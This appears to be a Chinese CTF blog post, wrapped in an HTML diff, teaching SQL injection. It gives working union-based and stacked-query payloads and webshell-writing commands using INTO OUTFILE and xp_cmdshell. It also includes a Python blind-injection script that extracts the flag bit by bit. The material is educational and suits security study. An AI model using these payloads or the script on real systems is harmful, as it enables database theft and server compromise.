@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Re-ctfshow-从零开始的SQL注入 | 全世界的面我都吃一遍</title><meta name="author" content="i4mhmh,i4mhmh@outlook.com"><meta name="copyright" content="i4mhmh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记录从原理开始的sql注入历程,也会将之后遇到的各种注入题目、绕过思路等更新到这篇文章里...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Re-ctfshow-从零开始的SQL注入">
+<meta property="og:url" content="https://i4mhmh.cn/archives/d87f7e0c.html">
+<meta property="og:site_name" content="全世界的面我都吃一遍">
+<meta property="og:description" content="记录从原理开始的sql注入历程,也会将之后遇到的各种注入题目、绕过思路等更新到这篇文章里...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i4mhmh.cn/img/t.jpeg">
+<meta property="article:published_time" content="2022-06-24T01:30:04.000Z">
+<meta property="article:modified_time" content="2023-04-13T13:15:06.334Z">
+<meta property="article:author" content="i4mhmh">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i4mhmh.cn/img/t.jpeg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://i4mhmh.cn/archives/d87f7e0c.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Re-ctfshow-从零开始的SQL注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-13 21:15:06'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="全世界的面我都吃一遍" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/t.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">36</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="全世界的面我都吃一遍"><span class="site-name">全世界的面我都吃一遍</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Re-ctfshow-从零开始的SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-24T01:30:04.000Z" title="发表于 2022-06-24 09:30:04">2022-06-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-13T13:15:06.334Z" title="更新于 2023-04-13 21:15:06">2023-04-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Re-ctfshow-从零开始的SQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>八股文</h1>
+<h2 id="原理">原理</h2>
+<p>​		在开发过程中构造的方法、函数对输入数据过滤不严,从而造成预期之外的返回结果,此时攻击者利用此漏洞来拼接执行恶意SQL语句,从而达到攻击的目的。</p>
+<h2 id="注入类型">注入类型</h2>
+<p>​		参数类型划分: 字符型、数字型、搜索型注入</p>
+<p>​		注入方法划分: 基于报错的注入、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内敛查询注入、宽字节注入</p>
+<p>​		提交方式划分: GET注入、POST注入、COOKIE注入、HTTP头注入</p>
+<h2 id="如何判断不同的数据库">如何判断不同的数据库</h2>
+<ol>
+<li>通过对主机端口进行扫描，判断端口开放的情况大概判断出类型</li>
+</ol>
+<blockquote>
+<p>Oracle: 1521 	 SQL Server: 1433 	 MySQL: 3306  	PostgreSql: 	 5432</p>
+</blockquote>
+<ol start="2">
+<li>通过注入不同函数来判断数据库类型</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>特殊函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mysql</td>
+<td>@@version，version都可执行</td>
+</tr>
+<tr>
+<td>mssql</td>
+<td>substring可执行</td>
+</tr>
+<tr>
+<td>oracle</td>
+<td>substr</td>
+</tr>
+</tbody>
+</table>
+<ol start="3">
+<li>根据注释符号来判断</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>注释符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mysql</td>
+<td>#, --(后跟空格),  /* */</td>
+</tr>
+<tr>
+<td>Access</td>
+<td>null, %00</td>
+</tr>
+<tr>
+<td>oracle</td>
+<td>–(不跟空格), 不支持;子句查询</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>–(不跟空格)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mysql5-0以上以及5-0以下有什么区别">mysql5.0以上以及5.0以下有什么区别</h2>
+<p>5.0以下没有information.schema库,只能暴力跑表</p>
+<h2 id="Mysql-与-的区别">Mysql @ 与 @@的区别</h2>
+<p>一个@是用户自定义变量</p>
+<p>两个@是系统变量</p>
+<h2 id="Mysql注入常用函数">Mysql注入常用函数</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">database() 返回当前数据库名</span><br><span class="line">user() 返回当前数据库用户名</span><br><span class="line">updatexml() 更新xml文档，常用于报错注入</span><br><span class="line">mid() 从指定字段中提取出字段的内容</span><br><span class="line">limit() 返回结果中的前几条数据或者中间的数据</span><br><span class="line">concat() 返回参数产生的字符串</span><br><span class="line">group_concat() 分组拼接函数</span><br><span class="line">count() 返回指定参数的数目</span><br><span class="line">rand() 参数0~1个随机数</span><br><span class="line">flood() 向下取整</span><br><span class="line">substr() 截取字符串</span><br><span class="line">ascii() 返回字符串的ascii码</span><br><span class="line">left() 返回字符串最左边指定个数的字符</span><br><span class="line">ord() 返回字符的ascii码</span><br><span class="line">length() 返回字符串长度</span><br><span class="line">sleep() 延时函数</span><br></pre></td></tr></table></figure>
+<h2 id="sql注入写shell">sql注入写shell</h2>
+<p><strong>条件</strong></p>
+<p>当前数据库用户有dba权限, 需要有网站的绝对路径且有可写目录, mysql的<code>secure_file_priv</code>配置为空</p>
+<p><strong>用法</strong>:</p>
+<p>mysql:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,&#x27;shell&#x27; into outfile &quot;网站绝对路径\shell&quot; #</span><br></pre></td></tr></table></figure>
+<p>sqlserver:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;EXEC master..xp_cmdshell &#x27;</span>echo &quot;shell内容&quot; <span class="operator">&gt;</span> 绝对路径\shell.asp<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+<h1>各种注入例题</h1>
+<h2 id="web2-最基础的字符型-post型注入">web2 最基础的字符型\post型注入</h2>
+<p><code>[ctf.show](https://ctf.show/challenges#web2-7)</code></p>
+<h3 id="打开后是一个登录界面">打开后是一个登录界面</h3>
+<p><img src="../img/image-20220625125447673.png" alt="image-20220625125447673"></p>
+<p>这里我已经尝试过万能密码返回的登录成功,即存在sql注入且目前并没有对基本的函数进行过滤</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户名: admin<span class="string">&#x27; or 1=1#                                                   &#x27;</span></span><br><span class="line">密码: 	<span class="number">111</span></span><br><span class="line"></span><br><span class="line">这里单引号用于闭合id</span><br><span class="line">例:</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27;; 这里#只是把后边的单引号注释掉了</span></span><br><span class="line"><span class="string">就是为什么分号没有被注释掉啊</span></span><br></pre></td></tr></table></figure>
+<p>在数据库中就是</p>
+<p><img src="../img/image-20220625135437800.png" alt="image-20220625135437800"></p>
+<h3 id="判断有多少个字段这里返回了多少个字段值">判断有多少个字段这里返回了多少个字段值</h3>
+<p><img src="../img/image-20220625135620778.png" alt="image-20220625135620778"></p>
+<p>像这样,里边有username,passwd,flag三个字段,当sql语句如<code> select passwd,flag from demo where username =xxxx</code>的时候,数据库会返回两个字段,此时我们<code>order by 1 或者order by 2 </code>都不会出错,因为是按照passwd和flag来排序的,但是到3之后就会出错</p>
+<p><img src="../img/image-20220625141224139.png" alt="image-20220625141224139"></p>
+<p>当order by 4的时候,并没有返回值,证明只存在三个返回字段</p>
+<h3 id="查看展示字段">查看展示字段</h3>
+<p><img src="../img/image-20220625142752648.png" alt="image-20220625142752648"></p>
+<p>这里union select 的1,2,3;类比本地mysql,就是与username, passwd合并在一起,如果前段展示的是username,这里就会把1显示出来,如果是passwd则会展示2.如下图</p>
+<p><img src="../img/image-20220625143425478.png" alt="image-20220625143425478"></p>
+<p>所以说2这里可以回显数据库中其他数据</p>
+<h3 id="注入">注入</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,database(),3#&amp;password=213   显示当前数据库</span></span><br></pre></td></tr></table></figure>
+<p><img src="../img/image-20220625143504592.png" alt="image-20220625143504592"></p>
+<p>拿到数据库后拿表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,table_name,3 from information_schema.tables where table_schema= &#x27;</span>web2<span class="string">&#x27;#&amp;password=213</span></span><br></pre></td></tr></table></figure>
+<p><code>information_schema下的table表</code>存的是数据库所有表的信息,它从属的库就在table_schema字段中</p>
+<p><img src="../img/image-20220625144707047.png" alt="image-20220625144707047"></p>
+<p>这里把从属于web2数据库的表flag,user返回了接下来查表下边的列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#&amp;password=111</span></span><br></pre></td></tr></table></figure>
+<p>这一句话就跟上边查表名差不多了,information_schema下的<code>columns</code>表存的有列的信息</p>
+<p><img src="../img/image-20220625145513367.png" alt="image-20220625145513367"></p>
+<p>可以看到,flag表下有一个flag列,这里把列中的数据打印出来即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,flag,3 from flag#&amp;password=111</span></span><br></pre></td></tr></table></figure>
+<p><img src="../img/image-20220625150149327.png" alt="image-20220625150149327"></p>
+<h2 id="web3-web7">web3 web7</h2>
+<p>只是过滤了空格字符,这里把绕过技巧放在最后单独列出来</p>
+<h2 id="GYCTF2020-Blacklist">[GYCTF2020]Blacklist</h2>
+<p><img src="../img/image-20220908191910079.png" alt="image-20220908191910079"></p>
+<p>打开如图, 测试1’ or 1=1#</p>
+<p><img src="../img/image-20220908191955975.png" alt="image-20220908191955975"></p>
+<p>发现过滤如下</p>
+<p><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
+<p>把操作符过滤掉了</p>
+<p>构造payload<code>1';show databases;</code></p>
+<p><img src="../img/image-20220908192232273.png" alt="image-20220908192232273"></p>
+<p><code>1;show tables;</code></p>
+<p><img src="../img/image-20220908194331945.png" alt="image-20220908194331945"></p>
+<p><code>1'; HANDLER FlagHere OPEN; HANDLER FlagHere READ first;#</code></p>
+<p><img src="../img/image-20220908194456103.png" alt="image-20220908194456103"></p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World">[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
+<p>一个盲注绕过</p>
+<p><img src="../img/image-20220908205638994.png" alt="demo"></p>
+<p>输入0会返回</p>
+<p><code>Error Occured When Fetch Result.</code></p>
+<p>输入1会返回</p>
+<p><code>Hello, glzjin wants a girlfriend.</code></p>
+<p>输入0^1则返回上边的hello 题目提示了flag在flag表的flag字段里</p>
+<p>以此来逐字判断flag, 因为过滤了空格,用括号来代替构造payload</p>
+<p><code>0^(ascii(substr((select(flag)from(flag)),&quot; + str(i) +&quot;,1))&gt;&quot;+str(mid)+&quot;)&quot;</code></p>
+<p>这里str(i)是判断第i位,substr(str,开始的位数1开始, 截取的位数)</p>
+<p>完整payload如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findFlag</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        miNum = <span class="number">32</span></span><br><span class="line">        maxNum = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> miNum &lt; maxNum:</span><br><span class="line">            mid = (maxNum + miNum) // <span class="number">2</span></span><br><span class="line">            demo = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),&quot;</span> + <span class="built_in">str</span>(i) +<span class="string">&quot;,1))&gt;&quot;</span>+<span class="built_in">str</span>(mid)+<span class="string">&quot;)&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: demo</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Occured&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                maxNum = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                miNum = mid + <span class="number">1</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(miNum)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://your-url/index.php&quot;</span></span><br><span class="line">    findFlag(url)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>即可跑出flag</p>
+<h1>绕过技巧</h1>
+<h2 id="空格被过滤">空格被过滤</h2>
+<ul>
+<li>/**/绕过</li>
+<li>%a0代替</li>
+<li></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://i4mhmh.cn">i4mhmh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://i4mhmh.cn/archives/d87f7e0c.html">https://i4mhmh.cn/archives/d87f7e0c.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://i4mhmh.cn" target="_blank">全世界的面我都吃一遍</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/t.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/archives/7fd368e6.html" title="基于Golang的端口扫描器"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">基于Golang的端口扫描器</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/t.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">i4mhmh</div><div class="author-info__description">明年此日青云去,却笑人间举子忙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">36</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/i4mhmh"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/i4mhmh" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:i4mhmh@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Hi！ i4mhmh, A Master Student In Cyberspace Security 💤</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">八股文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">注入类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">如何判断不同的数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql5-0%E4%BB%A5%E4%B8%8A%E4%BB%A5%E5%8F%8A5-0%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">1.4.</span> <span class="toc-text">mysql5.0以上以及5.0以下有什么区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql-%E4%B8%8E-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.5.</span> <span class="toc-text">Mysql @ 与 @@的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">Mysql注入常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%86%99shell"><span class="toc-number">1.7.</span> <span class="toc-text">sql注入写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">各种注入例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B-post%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">web2 最基础的字符型\post型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%90%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2"><span class="toc-number">2.1.1.</span> <span class="toc-text">打开后是一个登录界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9C%89%E5%A4%9A%E5%B0%91%E4%B8%AA%E5%AD%97%E6%AE%B5%E8%BF%99%E9%87%8C%E8%BF%94%E5%9B%9E%E4%BA%86%E5%A4%9A%E5%B0%91%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-number">2.1.2.</span> <span class="toc-text">判断有多少个字段这里返回了多少个字段值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B1%95%E7%A4%BA%E5%AD%97%E6%AE%B5"><span class="toc-number">2.1.3.</span> <span class="toc-text">查看展示字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.4.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3-web7"><span class="toc-number">2.2.</span> <span class="toc-text">web3 web7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-number">2.3.</span> <span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">2.4.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 